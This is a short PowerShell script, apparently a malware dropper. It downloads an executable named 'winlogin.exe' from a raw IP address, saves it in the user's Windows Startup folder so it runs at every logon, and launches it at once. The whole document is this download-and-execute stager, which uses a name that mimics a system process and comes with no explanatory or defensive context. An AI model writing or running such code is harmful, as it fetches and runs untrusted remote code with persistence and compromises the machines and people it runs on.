$down = New-Object System.Net.WebClient
$url  = 'http://44.203.122.41:80/winlogin.exe'
$file = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\winlogin.exe"
$down.DownloadFile($url, $file)

$exec = New-Object -ComObject shell.application
$exec.ShellExecute($file);
